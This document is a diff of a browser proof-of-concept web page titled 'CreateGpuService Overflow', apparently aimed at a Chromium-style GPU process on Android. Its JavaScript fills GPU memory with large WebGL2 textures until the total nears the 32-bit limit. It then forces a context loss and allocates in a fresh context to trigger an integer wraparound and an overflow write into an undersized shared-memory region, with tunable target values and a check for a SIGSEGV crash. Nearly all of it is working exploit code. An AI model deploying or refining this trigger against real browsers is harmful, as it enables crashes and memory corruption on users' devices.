@@ -1,78 +1,70 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>CreateGpuService Overflow PoC</h1>
+<h1>CreateGpuService Overflow – Final</h1>
 <pre id="log"></pre>
 <script>
+// CHANGE THIS: 0xFFFFFFF5 is ideal, but start with a lower value and increase
+const TARGET_BYTES = 0xFFFF0000; // try 0xFFFF0000, 0xFFFFFF00, 0xFFFFFFA0, etc.
+
 (async function() {
   const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
 
-  // Step 1: Create an OffscreenCanvas and WebGL2 context
   const canvas = new OffscreenCanvas(256, 256);
-  const gl = canvas.getContext('webgl2', {
-    powerPreference: 'high-performance',
-    failIfMajorPerformanceCaveat: false
-  });
+  const gl = canvas.getContext('webgl2', { powerPreference: 'high-performance' });
   if (!gl) return log('WebGL2 not supported');
 
   const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-  // Use 2048x2048 to stay safe while still consuming 16 MB each
-  const texWidth = Math.min(2048, maxSize);
-  const texHeight = Math.min(2048, maxSize);
-  const bytesPerTex = texWidth * texHeight * 4; // RGBA
+  // Use 4096x4096 (64 MB) to quickly reach high totals
+  const texSize = Math.min(4096, maxSize);
+  const bytesPerTex = texSize * texSize * 4;
+  log(`Texture size: ${texSize}x${texSize}, bytes: ${bytesPerTex}`);
 
-  log(`Using ${texWidth}x${texHeight} textures (${bytesPerTex} bytes each)`);
-  log(`Max possible textures before 32-bit wrap: ${Math.floor(0xFFFFFFFF / bytesPerTex)}`);
-
-  const textures = [];
   let totalBytes = 0;
+  const textures = [];
 
-  // Step 2: Allocate textures until we get close to 32-bit overflow
-  // We'll stop a few hundred MB before overflow to avoid an OOM kill
-  const targetBytes = 0xFFFFFFFF - 500 * 1024 * 1024; // 500 MB before wrap
-  while (totalBytes < targetBytes) {
+  // Allocate textures until totalBytes >= TARGET_BYTES
+  while (totalBytes < TARGET_BYTES) {
     const tex = gl.createTexture();
     gl.bindTexture(gl.TEXTURE_2D, tex);
-    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texWidth, texHeight, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
     textures.push(tex);
     totalBytes += bytesPerTex;
-    if (textures.length % 100 === 0) log(`Allocated ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
+    if (textures.length % 10 === 0) {
+      log(`Allocated ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
+    }
   }
-  log(`Paused at ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
+  log(`Reached target: ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
 
-  // Step 3: Force a GPU process restart (which will call CreateGpuService with the total)
-  // The browser should pass the current total discardable memory size to the new process.
-  // We induce a restart by losing the WebGL context.
+  // Force GPU process restart (context loss)
   const loseExt = gl.getExtension('WEBGL_lose_context');
   if (loseExt) {
     loseExt.loseContext();
-    log('Context lost. GPU process should restart soon.');
+    log('Context lost, waiting for GPU process restart...');
   }
 
-  // Wait a bit for the restart
-  setTimeout(() => {
-    log('Attempting to create a new context with a size that overflows...');
-    // Step 4: Create a new context. The browser will send CreateGpuService with the total size
-    // from the previous context, which is near 0xFFFFFFFF. With the new context, the GPU process
-    // will try to allocate a shared memory region, overflow, and crash.
+  // After a short delay, try to create a new context.
+  // The new GPU process will request the total memory from the browser,
+  // which will overflow and allocate a tiny shared memory region.
+  setTimeout(async () => {
+    log('Creating new context...');
     try {
       const newCanvas = new OffscreenCanvas(1, 1);
-      const newGl = newCanvas.getContext('webgl2', {
-        powerPreference: 'high-performance',
-        failIfMajorPerformanceCaveat: false
-      });
+      const newGl = newCanvas.getContext('webgl2', { powerPreference: 'high-performance' });
       if (newGl) {
-        log('New context created. If the overflow occurred, the GPU process should have crashed with SIGSEGV.');
-        // Try a small allocation to trigger the overflow (the first allocation after init uses the wrapped size)
+        // Immediately allocate a texture to force the GPU process to use
+        // the (now tiny) shared memory, triggering an overflow write.
         const tex = newGl.createTexture();
         newGl.bindTexture(newGl.TEXTURE_2D, tex);
         newGl.texImage2D(newGl.TEXTURE_2D, 0, newGl.RGBA, 1, 1, 0, newGl.RGBA, newGl.UNSIGNED_BYTE, null);
-        log('Texture allocated successfully (unexpected)');
+        log('Texture allocated in new context – check logcat for SIGSEGV!');
+      } else {
+        log('New context creation failed – may have crashed already.');
       }
     } catch(e) {
-      log('Error creating new context: ' + e.message);
+      log('Error during new context: ' + e.message);
     }
-  }, 2000);
+  }, 3000);
 })();
 </script>
 </body>
